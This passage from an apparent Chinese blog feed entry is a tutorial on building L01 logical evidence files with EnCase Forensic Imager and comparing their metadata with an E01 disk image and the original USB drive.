src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375937782-682a8bb0-f7f5-4789-b1fe-9128355c6083.png" class="" title="image"></p><p>文件信息</p><ul><li><strong>Source</strong><br>数据源。显示将要制作逻辑证据文件的文件的来源。</li><li><strong>Files</strong><br>文件。显示将要制作逻辑证据文件的文件的数量及总大小。</li><li><strong>Target folder within Evidence File</strong><br>证据文件中的目标文件夹。可选项，未填写时，所有文件直接保存在逻辑证据文件中，填写后，文件保存在逻辑证据文件中的对应文件夹中。</li><li><strong>Include contents of files</strong><br>包括文件内容。如果不勾选，创建的逻辑证据文件中不包括文件内容部分，只包括属性等部分内容，适用于大文件且不关心文件内容本身。</li><li><strong>Include contents of folder objects</strong><br>包括文件夹内容。</li><li><strong>File in use</strong><br>被占用的文件。</li><li><strong>Lock file when completed</strong><br>完成后锁定文件。勾选后生成的逻辑证据文件不可追加新内容。</li><li><strong>Include original extents</strong><br>包括原始位置信息。勾选后，生成的记录文件中会包含文件的物理位置、物理扇区等信息。</li></ul><p>上面这部分选项可以根据实际需要勾选。</p><p><strong>逻辑证据格式</strong></p><p>**<br>**<img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616144702025-6111c793-2610-461e-8983-09849ca072c2.png" class="" title="image"></p><p>逻辑证据格式</p><ul><li><strong>Evidence File Format</strong><br>逻辑证据文件格式。可以选择L01或Lx01。</li><li><strong>Entry Hash</strong><br>文件哈希。可以选择是否计算机勾选文件（或文件夹）的MD5值。</li><li><strong>Compression</strong><br>压缩。可以选择镜像文件是否压缩。</li><li><strong>File Segment Size(MB)</strong><br>分段大小。和制作证据文件时候的用法一致。</li><li><strong>Encryption</strong><br>加密。仅对Lx01格式有效，可以对数据部分进行加密。</li></ul><p>本案例中，逻辑证据格式选择了L01，名称填写了“disk目录文件”，案件编号填写了“20180616001”，证据编号填写了“20180616001-000-002”，操作人员填写了我的名字“胡壮”，备注信息填写了“重要文件”，“Target folder within Evidence File”填写了“disk目录文件”，镜像保存路径选择了D盘根目录，文件相关的设置全部勾选。</p><h4 id="逻辑证据文件包含的内容"><a href="#逻辑证据文件包含的内容" class="headerlink" title="逻辑证据文件包含的内容"></a>逻辑证据文件包含的内容</h4><p>制作好了逻辑证据文件，回到EnCase Imager的证据列表界面，将D盘的“disk目录文件.L01”拖到EnCase Imager窗口然松开鼠标，即可将将制作的逻辑证据文件添加到EnCase Imager。为了方便待会进行对比，才次将测试优盘添加到证据列表（制作完证据文件后最初添加进证据列表中的优盘已经被证据文件thumb.E01替代了）。如下图所示。</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616144776574-3ef04bf6-2104-43eb-8c0f-136edec8b4f7.png" class="" title="image"><p>添加逻辑证据文件到EnCase Imager</p><p>通过观察，对比上文中加载的证据文件截图，可以发现逻辑证据文件是没有整个数据部分的哈希值的，也无法无法记录诸如原始设备的序列号等信息。</p><p>同时勾选证据列表中的证据文件“thumb”、逻辑证据文件“disk目录文件”及磁盘编号为“14”的优盘，然后点击“OPEN”按钮，同时加载三个证据项目进行浏览。如下图所示。</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375721175-2a4c3431-3385-4913-acbf-7d9064d25e4f.png" class="" title="image"><p>同时打开多个证据</p><p>点击证据“thumb”第一分区的“.disk”目录左边的遍历按钮（正方形勾选框左边的五边形），然后按住Ctrl键不放，接下来点击证据“disk目录文件”的“disk目录文件”和证据“14”第一分区“.disk”目录录左边的遍历按钮，同时在右边的列表面板列出三个目录中的文件。如下图所示。</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616375720160-a157c798-9087-435b-88eb-9f6c89bc29f7.png" class="" title="image"><p>同时浏览多个目录文件</p><p>接下来分别比较“thumb\C.disk\casper-uuid-generic”、“disk目录文件\disk目录文件\casper-uuid-generic”及“14\C.disk\casper-uuid-generic”三个文件。如下图所示。</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616144701990-8859d78e-f488-491a-883a-1bd1fdc1e271.png" class="" title="image"><p>disk目录文件\disk目录文件\casper-uuid-generic</p><img src="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/1616144702013-8d3dd345-cfb6-42a9-84c9-3857d15aa5cf.png" class="" title="image"><p>14\C.disk\casper-uuid-generic</p><p>通过对比，证据文件中的“casper-uuid-generic”和另外两个证据中的对应文件相比多了File Acquired时间，而逻辑证据文件中的“casper-uuid-generic”和另外两个证据中的对应文件相比则多了MD5值。另外一个出不明显的地方是，逻辑证据文件中保存的文件无法查看文件在文件系统的路径，而证据文件则不存在此问题。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>EnCase Imager的功能基本相当于没有插加密狗或导入授权证书文件的EnCase，但是EnCase可以使用条件及过滤器对文件进行筛选。和其他镜像工具不不同，EnCase Imager虽然支持浏览本地磁盘会镜像文件中的文件，且浏览的时候可以直接显示部分删除的文件，但EnCase Imager仅支持查看文件的目录结构及各项属性，不支持对文件进行任何操作，包括文件的预览及导出。</p><p>EnCase Imager制作的镜像文件中，保存的元数据比其他镜像工具要多，例如磁盘的型号、序列号，包括FTK Imager在内的大部分镜像工具制作镜像时都不会保存。</p><p>本文仅仅是蜻蜓点水般地介绍了EnCase Imager的基本功能，算是抛砖引玉，诸如内存镜像、镜像还原、哈希计算、EnScript等功能，大家可以自己去摸索。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.yidianzixun.com/article/0JUs8BhG">https://www.yidianzixun.com/article/0JUs8BhG</a></p><p><a href="https://security.opentext.com/document/product-brief/encase-forensic-imager">https://security.opentext.com/document/product-brief/encase-forensic-imager</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;EnCase Forensic Imager(win)&lt;/p&gt;
&lt;p&gt;EnCase V8是美国Guidance Software推出的最新计算机取证软件，全新的操作界面，采用全新的取证分析的工作流，让新版更加简单易用，提供了更加强大灵活的报告功能（可模板定制），此外EnCa</summary>
      
    
    
    
    
  </entry>
  
</feed>
